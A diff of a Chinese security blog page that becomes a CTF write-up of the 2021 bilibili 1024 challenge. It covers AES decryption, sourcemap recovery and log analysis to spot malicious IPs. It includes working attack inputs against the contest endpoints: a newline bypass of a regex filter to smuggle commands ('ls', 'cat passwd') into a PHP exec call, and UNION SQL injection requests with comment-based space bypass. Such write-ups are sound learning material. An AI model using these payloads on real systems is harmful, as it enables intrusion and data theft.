@@ -22,7 +22,7 @@
     <meta name="description" content="信息安全技术博客">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>c1ay&#39;s blog</title>
+    <title>2021 bilibili 1024挑战赛 · c1ay&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >c1ay&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2021 bilibili 1024挑战赛</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>c1ay's blog</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            2021 bilibili 1024挑战赛
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.1k</span>阅读时长: <span class="post-count reading-time">10 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/11/04</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,112 +399,112 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/12/14/2020网鼎杯总决赛web题/" >
-            
-                <span>2020网鼎杯总决赛web题</span>
-        </a>
-        <div class="abstract-content">
-            game_exp漏洞一：phar反序列化
-regiter.php当中第3行-第9行：
-1234567class AnyClass&#123;    var $output = 'echo "ok";';    function __destruct()    &#123;        eval($this -&gt; output);    &#125;&#125;
-AnyClass类的__destruct存在反序列化，而第31行file_exists函数刚好可以触发phar反序列化
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="2021-bilibili-1024挑战赛"><a href="#2021-bilibili-1024挑战赛" class="headerlink" title="2021 bilibili 1024挑战赛"></a>2021 bilibili 1024挑战赛</h1><h3 id="安全攻防"><a href="#安全攻防" class="headerlink" title="安全攻防"></a>安全攻防</h3><p><strong>第一题：</strong></p>
+<p>1024程序员节，大家一起和2233参与解密游戏吧~<br>happy_1024_2233:<br>e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364<br>0408abca7deabb96a58f50471171b60e02b1a8dbd32db156</p>
+<p>aes ecb，密文和密钥都给了，直接写脚本即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span><span class="params">()</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></div><div class="line">        self.key = key</div><div class="line">        <span class="comment">#self.key = key + (32-len(key)) * chr(0)</span></div><div class="line">        <span class="comment"># self.key = key + (24-len(key)) * chr(0) # AES-192-ECB</span></div><div class="line">        self.key = key + (<span class="number">16</span>-len(key)) * chr(<span class="number">0</span>) <span class="comment"># AES-128-ECB</span></div><div class="line">        self.BLOCK_SIZE = <span class="number">16</span>  <span class="comment"># Bytes</span></div><div class="line">        self.pad = <span class="keyword">lambda</span> s: s + (self.BLOCK_SIZE - len(s) % self.BLOCK_SIZE) * chr(self.BLOCK_SIZE - len(s) % self.BLOCK_SIZE)</div><div class="line">        <span class="comment">#self.unpad = lambda s: s[:-ord(s[len(s) - 1:])]</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, enc)</span>:</span></div><div class="line">        enc=binascii.a2b_hex(enc)</div><div class="line">        <span class="comment">#enc=enc.decode("hex")</span></div><div class="line">        cipher = AES.new(self.key, AES.MODE_ECB)</div><div class="line">        <span class="keyword">return</span> cipher.decrypt(enc)</div><div class="line"></div><div class="line"><span class="keyword">print</span> AESCipher(<span class="string">"happy_1024_2233"</span>).decrypt(<span class="string">"e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d3640408abca7deabb96a58f50471171b60e02b1a8dbd32db156"</span>)</div></pre></td></tr></table></figure>
+<p>a1cd5f84-27966146-3776f301-64031bb9</p>
+<p><strong>第二题：</strong></p>
+<p>某高级前端开发攻城狮更改了一个前端配置项<br><a href="https://security.bilibili.com/sec1024/q/" target="_blank" rel="external">https://security.bilibili.com/sec1024/q/</a></p>
+<p>根据提示是sourceMap</p>
+<p>下载<br><a href="https://security.bilibili.com/sec1024/q/js/chunk-4871f04e.e8a41f19.js.map" target="_blank" rel="external">https://security.bilibili.com/sec1024/q/js/chunk-4871f04e.e8a41f19.js.map</a></p>
+<p>通过restore-source-tree还原<br>在home.vue当中发现flag</p>
+<p><img src="http://pic.c1imber.top/blog/20211104/cTn7gt8R0lwC.png?imageslim" alt="mark"></p>
+<p>36c7a7b4-cda04af0-8db0368d-b5166480</p>
+<p><strong>第三题：</strong></p>
+<p>PHP is the best language for web programming, but what about other languages?<br><a href="https://security.bilibili.com/sec1024/q/eval.zip" target="_blank" rel="external">https://security.bilibili.com/sec1024/q/eval.zip</a></p>
+<p>php源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="comment">/* </span></div><div class="line"><span class="comment">        bilibili- ( ゜- ゜)つロ 乾杯~</span></div><div class="line"><span class="comment">        uat: http://192.168.3.2/uat/eval.php</span></div><div class="line"><span class="comment">        pro: http://security.bilibili.com/sec1024/q/pro/eval.php</span></div><div class="line"><span class="comment">    */</span></div><div class="line">    $args = @$_GET[<span class="string">'args'</span>];</div><div class="line">    <span class="keyword">if</span> (count($args) &gt;<span class="number">3</span>) &#123;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> ( $i=<span class="number">0</span>; $i&lt;count($args); $i++ )&#123;</div><div class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">'/^\w+$/'</span>, $args[$i]) ) &#123;</div><div class="line">            <span class="keyword">exit</span>();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// <span class="doctag">todo:</span> other filter</span></div><div class="line">    $cmd = <span class="string">"/bin/2233 "</span> . implode(<span class="string">" "</span>, $args);</div><div class="line">    exec($cmd, $out);</div><div class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;count($out); $i++)&#123;</div><div class="line">        <span class="keyword">echo</span>($out[$i]);</div><div class="line">        <span class="keyword">echo</span>(<span class="string">'&lt;br&gt;'</span>);</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><code>preg_match</code>的<code>$</code>可以用<code>%0A</code>换行符绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https:<span class="comment">//security.bilibili.com/sec1024/q/pro/eval.php?args[0]=x%0A&amp;args[1]=ls</span></div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211104/GQEK4wkurXC7.png?imageslim" alt="mark"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https:<span class="comment">//security.bilibili.com/sec1024/q/pro/eval.php?args[0]=x%0A&amp;args[1]=cat&amp;args[2]=passwd</span></div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211104/2BGUYFSG3mDp.png?imageslim" alt="mark"></p>
+<p>9d3c3014-6c6267e7-086aaee5-1f18452a</p>
+<p><strong>第四题：</strong></p>
+<p>sql注入</p>
+<p>空格会影响注入，用<code>/**/</code>绕过空格即可</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /sec1024/q/admin/api/v1/log/list HTTP/1.1</div><div class="line">Host: security.bilibili.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: application/json, text/plain, */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/json;charset=utf-8</div><div class="line">Content-Length: 190</div><div class="line">Origin: https://security.bilibili.com</div><div class="line">Connection: close</div><div class="line">Referer: https://security.bilibili.com/sec1024/q/</div><div class="line"></div><div class="line">&#123;"user_id":"","user_name":"1/**/union/**/select/**/1,group_concat(table_name),3,4,5/**/from/**/information_schema.tables/**/where/**/table_schema=database()#","action":"","page":1,"size":20&#125;</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211104/4P7GnxOaFJX9.png?imageslim" alt="mark"></p>
+<p>单引号会影响注入，用16进制编码一下</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /sec1024/q/admin/api/v1/log/list HTTP/1.1</div><div class="line">Host: security.bilibili.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: application/json, text/plain, */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/json;charset=utf-8</div><div class="line">Content-Length: 190</div><div class="line">Origin: https://security.bilibili.com</div><div class="line">Connection: close</div><div class="line">Referer: https://security.bilibili.com/sec1024/q/</div><div class="line"></div><div class="line">&#123;"user_id":"","user_name":"1/**/union/**/select/**/1,group_concat(column_name),3,4,5/**/from/**/information_schema.columns/**/where/**/table_name=0x666c6167#","action":"","page":1,"size":20&#125;</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211104/sjCRQ3q6gMbM.png?imageslim" alt="mark"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /sec1024/q/admin/api/v1/log/list HTTP/1.1</div><div class="line">Host: security.bilibili.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: application/json, text/plain, */*</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/json;charset=utf-8</div><div class="line">Content-Length: 111</div><div class="line">Origin: https://security.bilibili.com</div><div class="line">Connection: close</div><div class="line">Referer: https://security.bilibili.com/sec1024/q/</div><div class="line"></div><div class="line">&#123;"user_id":"","user_name":"1/**/union/**/select/**/1,id,3,4,5/**/from/**/flag#","action":"","page":1,"size":20&#125;</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211104/gycztWMh2AGS.png?imageslim" alt="mark"></p>
+<p>3d5dd579-0678ef93-18b70cae-cabc5d51</p>
+<p><strong>第七题：</strong></p>
+<p>安全研究员小孙在早上的时候发现了一波异常流量在访问网站，他初步筛选了这些可疑的请求，请帮他找到所有的恶意 IP 。<br>flag 生成方式：找到所有的恶意 IP 后，通过通过英文逗号分隔成一个字符串后提交，系统会根据提交的 IP 正确数计算分数。<br>PS: 解题过程可发送至 security@bilibili.com, 标题: 1024-sec-r7-[你的 mid] 。我们会挑选3位，给予额外惊喜</p>
+<p>题目名称是风控，在对日志流量进行审计后，并没发现有明显的攻击payload，所以我把重点放在了<strong>在某一时间点出现的ip次数</strong>，如果说在某个时间，这个ip请求多次，那么我便将他算入恶意ip之内</p>
+<p>第一步：首先用sublime的正则处理功能将日志当中的时间（@timestamp）和ip（x_backend_bili_real_ip）提取出来</p>
+<p><img src="http://pic.c1imber.top/blog/20211104/S0hzbwBpObyG.png?imageslim" alt="mark"></p>
+<p>第二步：将第一步提取出的481888条时间的出现次数进行计算（时间去重后只剩下302条），得到时间点和该时间点的http请求数</p>
+<p><img src="http://pic.c1imber.top/blog/20211104/znizxaGtukGp.png?imageslim" alt="mark"></p>
+<p>第三步：将第一步提取的时间和ip导入数据库，以便于整理统计</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">database</span> bilibili1024;</div><div class="line"><span class="keyword">use</span> bilibili1024;</div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> fengkong(<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">null</span> auto_increment primary <span class="keyword">key</span>,tmptime <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>,ip <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>);</div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> fengkong(tmptime,ip) <span class="keyword">value</span>(<span class="string">"2021-10-18T02:00:04+0000"</span>,<span class="string">"gg.cej.hd.bii"</span>);</div><div class="line">...</div><div class="line">...</div><div class="line">...</div></pre></td></tr></table></figure>
+<p>第四步：对某个时间出现的ip次数进行计算</p>
+<p>规则：筛选出某一时间同一ip出现次数大于100的ip（100可能有点多了，可以进行适当的减少，例如可以从10、15、20、25…、100这样依次增加）</p>
+<p>可以通过mysql的聚合查询+子查询实现：</p>
+<p>calc.sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> ip,<span class="keyword">count</span>(*) <span class="keyword">as</span> <span class="keyword">count</span> <span class="keyword">from</span> fengkong <span class="keyword">where</span> tmptime=<span class="string">"2021-10-18T02:00:03+0000"</span> <span class="keyword">group</span> <span class="keyword">by</span> ip)x <span class="keyword">where</span> x.count&gt;<span class="number">100</span>;</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> ip,<span class="keyword">count</span>(*) <span class="keyword">as</span> <span class="keyword">count</span> <span class="keyword">from</span> fengkong <span class="keyword">where</span> tmptime=<span class="string">"2021-10-18T02:00:04+0000"</span> <span class="keyword">group</span> <span class="keyword">by</span> ip)x <span class="keyword">where</span> x.count&gt;<span class="number">100</span>;</div><div class="line">...</div></pre></td></tr></table></figure>
+<p>编写php批量执行sql，获得结果，php代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$servername = <span class="string">"localhost"</span>;</div><div class="line">$username = <span class="string">"root"</span>;</div><div class="line">$password = <span class="string">"root"</span>;</div><div class="line">$dbname = <span class="string">"bilibili1024"</span>;</div><div class="line"></div><div class="line">$lines = file(<span class="string">"calc.sql"</span>);</div><div class="line"></div><div class="line"><span class="comment">// 创建连接</span></div><div class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</div><div class="line"><span class="comment">// Check connection</span></div><div class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . $conn-&gt;connect_error);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">foreach</span>($lines <span class="keyword">as</span> $line) &#123;</div><div class="line">    $sql = rtrim($line);</div><div class="line">    <span class="comment">//print("$sql\n");</span></div><div class="line">    $result = $conn-&gt;query($sql);</div><div class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="comment">// 输出数据</span></div><div class="line">        <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</div><div class="line">            <span class="keyword">echo</span> $row[<span class="string">'count'</span>].<span class="string">"\t"</span>.$row[<span class="string">'ip'</span>].<span class="string">"\n"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$conn-&gt;close();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>得到结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">112	bfh.ff.dj.jf</div><div class="line">106	bfh.ff.dj.jf</div><div class="line">106	bfh.ff.dj.jf</div><div class="line">109	bfh.ff.dj.jf</div><div class="line">107	bfh.ff.dj.jf</div><div class="line">110	bfh.ff.dj.jf</div><div class="line">115	bfh.ff.dj.jf</div><div class="line">113	bfh.ff.dj.jf</div><div class="line">122	bfh.ff.dj.jf</div><div class="line">137	bfh.ff.dj.jf</div><div class="line">798	cd.baf.cae.cbc</div><div class="line">1652	cd.baf.cae.cbc</div><div class="line">2805	cd.baf.cae.cbc</div><div class="line">1546	cd.bb.cai.cbh</div><div class="line">1563	cdd.bcc.bg.bib</div><div class="line">1520	dc.bcc.bg.bib</div><div class="line">1577	cd.bb.cai.cbh</div><div class="line">1566	cdd.bcc.bg.bib</div><div class="line">1562	dc.bcc.bg.bib</div><div class="line">1569	cd.bb.cai.cbh</div><div class="line">1551	cdd.bcc.bg.bib</div><div class="line">1506	dc.bcc.bg.bib</div><div class="line">4735	cd.baf.cae.cbc</div><div class="line">1564	cd.bb.cai.cbh</div><div class="line">1539	cdd.bcc.bg.bib</div><div class="line">1535	dc.bcc.bg.bib</div><div class="line">1578	cd.bb.cai.cbh</div><div class="line">1589	cdd.bcc.bg.bib</div><div class="line">1568	dc.bcc.bg.bib</div><div class="line">2461	bba.ja.cca.beg</div><div class="line">2424	bba.ja.ccb.cbc</div><div class="line">2578	bbb.bb.bjd.bgc</div><div class="line">2494	bbb.bb.bjd.bgg</div><div class="line">2448	bbb.bb.bjd.bha</div><div class="line">2619	bbb.bb.bjd.bhc</div><div class="line">2539	bbb.bb.bjd.bhf</div><div class="line">2517	bba.ja.cca.beg</div><div class="line">2525	bba.ja.ccb.cbc</div><div class="line">2542	bbb.bb.bjd.bgc</div><div class="line">2563	bbb.bb.bjd.bgg</div><div class="line">2473	bbb.bb.bjd.bha</div><div class="line">2539	bbb.bb.bjd.bhc</div><div class="line">2427	bbb.bb.bjd.bhf</div><div class="line">2569	bba.ja.cca.beg</div><div class="line">2491	bba.ja.ccb.cbc</div><div class="line">2504	bbb.bb.bjd.bgc</div><div class="line">2566	bbb.bb.bjd.bgg</div><div class="line">2534	bbb.bb.bjd.bha</div><div class="line">2636	bbb.bb.bjd.bhc</div><div class="line">2521	bbb.bb.bjd.bhf</div><div class="line">9531	cde.ced.bbb.dd</div><div class="line">9469	dc.bb.ii.jj</div><div class="line">9587	jj.bdc.bbb.cc</div><div class="line">9406	cde.ced.bbb.dd</div><div class="line">9370	dc.bb.ii.jj</div><div class="line">9451	jj.bdc.bbb.cc</div><div class="line">9559	cde.ced.bbb.dd</div><div class="line">9302	dc.bb.ii.jj</div><div class="line">9414	jj.bdc.bbb.cc</div><div class="line">18854	cde.ced.bbb.dd</div><div class="line">18869	dc.bb.ii.jj</div><div class="line">18882	jj.bdc.bbb.cc</div></pre></td></tr></table></figure>
+<p>去重后得到在某个时间点访问次数超过100的ip:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bba.ja.cca.beg,bba.ja.ccb.cbc,bbb.bb.bjd.bgc,bbb.bb.bjd.bgg,bbb.bb.bjd.bha,bbb.bb.bjd.bhc,bbb.bb.bjd.bhf,bfh.ff.dj.jf,cd.baf.cae.cbc,cd.bb.cai.cbh,cdd.bcc.bg.bib,cde.ced.bbb.dd,dc.bb.ii.jj,dc.bcc.bg.bib,jj.bdc.bbb.cc</div></pre></td></tr></table></figure>
+<p>但是提交后依旧提示：”恭喜您找到了大部分ip地址，请再接再厉”</p>
+<p><img src="http://pic.c1imber.top/blog/20211104/E8z9Cn7y7s0P.png?imageslim" alt="mark"></p>
+<p>自己某一时间点ip出现次数大于100降低到某一时间点ip出现次数大于30后依旧是提示不够</p>
+<p>排除法：</p>
+<p>自己通过某些方法推测出了这道题目可能的检测规则：如果提交总ip数-错误数&gt;=8，就算通过，会提示”恭喜您找到了大部分ip地址”，在这个检测规则的前提下，通过排除法后得到下面这13个ip肯定是对的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bba.ja.cca.beg,bba.ja.ccb.cbc,bbb.bb.bjd.bgc,bbb.bb.bjd.bgg,bbb.bb.bjd.bha,bbb.bb.bjd.bhc,bbb.bb.bjd.bhf,cd.bb.cai.cbh,cdd.bcc.bg.bib,cde.ced.bbb.dd,dc.bb.ii.jj,dc.bcc.bg.bib,jj.bdc.bbb.cc</div></pre></td></tr></table></figure>
+<p>但是提交了依旧只能拿10分</p>
+<p>其他思路：</p>
+<p>1、根据某一时间内相同设备(根据user-agent)的访问次数这个规则来选择恶意ip，但是这个方法选择的ip会非常多，提交后会出现错误</p>
+<p>2、通过看浏览发现里面存在很多百度、谷歌、必应的爬虫请求，但是我认为爬虫不能算恶意请求，因为有时候需要对网站进行seo</p>
+<p>3、获取敏感信息的接口：<br>/activity/account/check/myinfo.<em><br>/account/history.</em><br>但是这些接口并不存在越权，而且通过这种方法找到的ip和通过时间找到的ip差不多一致</p>
 
-poc构造
-123456789101112131415&lt;?phpclass AnyClass&...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/12/14</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/12/14/2020网鼎杯半决赛web题/" >
-            
-                <span>2020网鼎杯半决赛web题</span>
-        </a>
-        <div class="abstract-content">
-            序第一次参加网鼎杯线下，由于太忙，这篇文章晚了一些，这次网鼎的赛制不同于以往线下的AWD模式，而是以一种AWD Plus的模式。
-AWD Plus规则简述每个队伍会有相同的靶机和题目源码，得分分值分为攻击分值和防御分值两部分，攻击分值就是选手需要先找到靶机存在的漏洞，然后通过构造可以利用成功的exp获取靶机的flag提交获取的分值，防御分值是选手需要提交相应的修复代码给平台，平台每隔一段时间会自动对赛场选手的靶机进行攻击，被平台攻击成功的队伍获取flag的队伍会失去防御分值，反之，防御成功就会获得相应的防御分值，还有一点需要注意的就是选手提交的修复代码不能导致靶机环境服务异常，否则会有异...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://c1aysec.github.io">c1ay</a>
+            <p>原文链接：<a href="https://c1aysec.github.io/2021/11/04/2021 bilibili 1024挑战赛/">https://c1aysec.github.io/2021/11/04/2021 bilibili 1024挑战赛/</a>
+            <p>发表日期：<a href="https://c1aysec.github.io/2021/11/04/2021 bilibili 1024挑战赛/">November 4th 2021, 2:31:32 pm</a>
+            <p>更新日期：<a href="https://c1aysec.github.io/2021/11/04/2021 bilibili 1024挑战赛/">November 4th 2021, 2:50:31 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/12/14</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/12/07/2020全国电信和互联网行业网络安全竞赛wp/" >
-            
-                <span>2020全国电信和互联网行业网络安全竞赛wp</span>
-        </a>
-        <div class="abstract-content">
-            序补一下，11月份的比赛，太忙一直没时间更新
-easy_sql很明显的注入，但是过滤了一些关键字，比如information、sys等，导致获取不到表名
-通过：
-uname=1&apos;) and updatexml(1,concat(0x3a,(select * from flag)),1);-- -&amp;passwd=1
-可以发现存在名为flag表，并且可以获取到里面的数据
-
